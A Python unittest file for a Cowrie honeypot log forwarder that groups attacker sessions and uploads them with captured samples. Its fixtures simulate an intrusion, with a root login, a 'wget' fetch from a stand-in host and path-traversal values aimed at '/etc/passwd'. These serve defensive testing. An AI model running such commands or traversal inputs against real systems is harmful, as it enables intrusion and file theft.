# SPDX-License-Identifier: GPL-2.0-or-later
# Copyright (C) 2026 The LanPulse authors
"""Checks for the Raspberry Pi forwarder. Run: python -m unittest discover -s tests -v"""
import hashlib
import importlib.util
import json
import os
import pathlib
import tempfile
import threading
import time
import unittest
from http.server import BaseHTTPRequestHandler, HTTPServer

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
spec = importlib.util.spec_from_file_location("fwd", os.path.join(ROOT, "tools", "pi-honeypot", "lanpulse-forwarder.py"))
fwd = importlib.util.module_from_spec(spec)
spec.loader.exec_module(fwd)

SHA = hashlib.sha256(b"payload").hexdigest()


def ev(eid, sid="s1", **kw):
    return {"eventid": eid, "session": sid, "timestamp": "2026-11-09T12:00:00.000000Z", **kw}


def cowrie_session(sid="s1"):
    return [
        ev("cowrie.session.connect", sid, src_ip="198.51.100.9", src_port=4444, dst_ip="10.0.0.2", dst_port=2222, protocol="ssh"),
        ev("cowrie.client.version", sid, version="SSH-2.0-Go"),
        ev("cowrie.client.kex", sid, hassh="abc123"),
        ev("cowrie.login.failed", sid, username="root", password="admin"),
        ev("cowrie.login.success", sid, username="root", password="toor"),
        ev("cowrie.command.input", sid, input="uname -a"),
        ev("cowrie.command.input", sid, input="wget http://203.0.113.5/a"),
        ev("cowrie.session.file_download", sid, url="http://203.0.113.5/a", outfile="var/lib/cowrie/downloads/" + SHA,
           shasum=SHA, destfile="/tmp/a"),
        ev("cowrie.session.closed", sid, duration_ms=12500),
    ]


class Grouping(unittest.TestCase):
    def test_full_session(self):
        s = fwd.Sessions("pi")
        done = [r for e in cowrie_session() if (r := s.feed(e))]
        self.assertEqual(len(done), 1)
        r = done[0]
        self.assertEqual((r["ip"], r["port"], r["proto"], r["client"], r["hassh"]), ("198.51.100.9", 2222, "ssh", "SSH-2.0-Go", "abc123"))
        self.assertEqual([x["ok"] for x in r["logins"]], [False, True])
        self.assertEqual(r["commands"], ["uname -a", "wget http://203.0.113.5/a"])
        self.assertEqual(r["files"][0]["sha256"], SHA)
        self.assertEqual(r["files"][0]["name"], "a")
        self.assertAlmostEqual(r["end"] - r["start"], 12.5, places=1)
        self.assertEqual(s.open, {})
        self.assertFalse(any(k.startswith("_") for k in fwd.public_session(r)))

    def test_interleaved_sessions(self):
        s = fwd.Sessions("pi")
        a, b = cowrie_session("a"), cowrie_session("b")
        order = [x for pair in zip(a, b) for x in pair]
        done = [r for e in order if (r := s.feed(e))]
        self.assertEqual(sorted(r["session"] for r in done), ["a", "b"])

    def test_junk_is_ignored(self):
        s = fwd.Sessions("pi")
        self.assertIsNone(s.feed({"eventid": "cowrie.command.input", "session": "unknown", "input": "x"}))
        self.assertIsNone(s.feed({"eventid": "cowrie.session.connect"}))
        self.assertIsNone(s.feed({"eventid": 5, "session": ["x"]}))

    def test_bad_shasum_is_dropped(self):
        s = fwd.Sessions("pi")
        s.feed(cowrie_session()[0])
        s.feed(ev("cowrie.session.file_download", shasum="../../etc/passwd", outfile="x"))
        self.assertEqual(s.open["s1"]["files"], [])

    def test_idle_sessions_flush(self):
        s = fwd.Sessions("pi")
        s.feed(cowrie_session()[0])
        self.assertEqual(s.idle(), [])
        self.assertEqual(len(s.idle(time.time() + fwd.IDLE_FLUSH + 5)), 1)

    def test_telnet(self):
        s = fwd.Sessions("pi")
        s.feed(ev("cowrie.session.connect", "t", src_ip="1.2.3.4", dst_port=2223, protocol="telnet"))
        self.assertEqual(s.feed(ev("cowrie.session.closed", "t", duration_ms=1))["proto"], "telnet")


class Files(unittest.TestCase):
    def test_find_file_stays_inside_cowrie(self):
        with tempfile.TemporaryDirectory() as d:
            home = os.path.join(d, "cowrie")
            os.makedirs(os.path.join(home, "var/lib/cowrie/downloads"))
            pathlib.Path(os.path.join(home, "var/lib/cowrie/downloads", SHA)).write_bytes(b"payload")
            pathlib.Path(os.path.join(d, "secret")).write_bytes(b"nope")
            self.assertTrue(fwd.find_file(home, {"sha256": SHA, "outfile": "var/lib/cowrie/downloads/" + SHA}).endswith(SHA))
            self.assertTrue(fwd.find_file(home, {"sha256": SHA, "outfile": ""}).endswith(SHA))
            self.assertIsNone(fwd.find_file(home, {"sha256": "0" * 64, "outfile": "../secret"}))
            self.assertIsNone(fwd.find_file(home, {"sha256": "0" * 64, "outfile": "/etc/passwd"}))


class Tailing(unittest.TestCase):
    def test_follows_appends_and_rotation(self):
        with tempfile.TemporaryDirectory() as d:
            log = os.path.join(d, "cowrie.json")
            st = fwd.State(os.path.join(d, "state.json"))
            self.assertEqual(fwd.read_new(log, st), [])                      # no file yet
            with open(log, "w") as f:
                f.write(json.dumps({"a": 1}) + "\n" + json.dumps({"a": 2}) + "\n" + '{"a": 3')    # last line incomplete
            self.assertEqual([e["a"] for e in fwd.read_new(log, st)], [1, 2])
            with open(log, "a") as f:
                f.write("}\n")
            self.assertEqual([e["a"] for e in fwd.read_new(log, st)], [3])
            self.assertEqual(fwd.read_new(log, st), [])
            os.rename(log, log + ".1")                                       # rotation: a new file takes the name
            with open(log, "w") as f:
                f.write(json.dumps({"a": 4}) + "\n")
            self.assertEqual([e["a"] for e in fwd.read_new(log, st)], [4])

    def test_bad_lines_skipped_and_state_persists(self):
        with tempfile.TemporaryDirectory() as d:
            log = os.path.join(d, "c.json")
            pathlib.Path(log).write_text("garbage\n" + json.dumps({"ok": 1}) + "\n")
            st = fwd.State(os.path.join(d, "s", "state.json"))
            self.assertEqual(fwd.read_new(log, st), [{"ok": 1}])
            st.save()
            self.assertEqual(fwd.State(st.path).d["offset"], st.d["offset"])


class Handler(BaseHTTPRequestHandler):
    log = []
    status = 200

    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(n)
        Handler.log.append((self.path, dict(self.headers), body))
        self.send_response(Handler.status)
        self.end_headers()
        self.wfile.write(b"{}")

    def log_message(self, *a):
        pass


class EndToEnd(unittest.TestCase):
    def setUp(self):
        Handler.log, Handler.status = [], 200
        self.srv = HTTPServer(("127.0.0.1", 0), Handler)
        threading.Thread(target=self.srv.serve_forever, daemon=True).start()
        self.url = f"http://127.0.0.1:{self.srv.server_port}"
        self.tmp = tempfile.TemporaryDirectory()
        self.home = os.path.join(self.tmp.name, "cowrie")
        os.makedirs(os.path.join(self.home, "var/lib/cowrie/downloads"))
        pathlib.Path(os.path.join(self.home, "var/lib/cowrie/downloads", SHA)).write_bytes(b"payload")

    def tearDown(self):
        self.srv.shutdown()
        self.srv.server_close()
        self.tmp.cleanup()

    def queue(self, st):
        s = fwd.Sessions("pi")
        for e in cowrie_session():
            r = s.feed(e)
            if r:
                fwd.queue_session(st, r)

    def test_sends_file_then_session(self):
        st = fwd.State(os.path.join(self.tmp.name, "st.json"))
        self.queue(st)
        fwd.flush_outbox(fwd.Client(self.url, "k"), st, self.home)
        self.assertEqual([p for p, _, _ in Handler.log], ["/api/honeypot/ingest/sample", "/api/honeypot/ingest/session"])
        path, hdr, body = Handler.log[0]
        self.assertEqual(body, b"payload")
        self.assertEqual(hdr["X-LanPulse-Key"], "k")
        self.assertEqual(hdr["X-Src-Ip"], "198.51.100.9")
        sess = json.loads(Handler.log[1][2])
        self.assertEqual(sess["commands"][0], "uname -a")
        self.assertEqual(st.d["outbox"], [])

    def test_retries_when_server_is_down_then_catches_up(self):
        st = fwd.State(os.path.join(self.tmp.name, "st.json"))
        self.queue(st)
        fwd.flush_outbox(fwd.Client("http://127.0.0.1:9", "k", timeout=1), st, self.home)    # nothing listens on port 9
        self.assertEqual(len(st.d["outbox"]), 2)
        fwd.flush_outbox(fwd.Client(self.url, "k"), st, self.home)
        self.assertEqual(st.d["outbox"], [])
        self.assertEqual(len(Handler.log), 2)

    def test_wrong_key_keeps_the_data(self):
        Handler.status = 403
        st = fwd.State(os.path.join(self.tmp.name, "st.json"))
        self.queue(st)
        fwd.flush_outbox(fwd.Client(self.url, "wrong"), st, self.home)
        self.assertEqual(len(st.d["outbox"]), 2)

    def test_hard_refusal_is_dropped(self):
        Handler.status = 400
        st = fwd.State(os.path.join(self.tmp.name, "st.json"))
        self.queue(st)
        fwd.flush_outbox(fwd.Client(self.url, "k"), st, self.home)
        self.assertEqual(st.d["outbox"], [])

    def test_file_not_yet_written_waits(self):
        os.remove(os.path.join(self.home, "var/lib/cowrie/downloads", SHA))
        st = fwd.State(os.path.join(self.tmp.name, "st.json"))
        self.queue(st)
        fwd.flush_outbox(fwd.Client(self.url, "k"), st, self.home)
        self.assertEqual([i["type"] for i in st.d["outbox"]], ["file"])             # the session went; the file waits
        st.d["outbox"][0]["t"] = time.time() - 700
        fwd.flush_outbox(fwd.Client(self.url, "k"), st, self.home)
        self.assertEqual(st.d["outbox"], [])                                         # given up after ten minutes

    def test_hello(self):
        self.assertEqual(fwd.Client(self.url, "k").hello("pi"), 200)
        path, hdr, body = Handler.log[0]
        self.assertEqual((path, hdr["X-LanPulse-Key"], json.loads(body)["sensor"]), ("/api/honeypot/ingest/hello", "k", "pi"))

    def test_same_file_sent_once(self):
        st = fwd.State(os.path.join(self.tmp.name, "st.json"))
        self.queue(st)
        self.queue(st)
        fwd.flush_outbox(fwd.Client(self.url, "k"), st, self.home)
        self.assertEqual(sum(1 for p, _, _ in Handler.log if p.endswith("/sample")), 1)


if __name__ == "__main__":
    unittest.main()
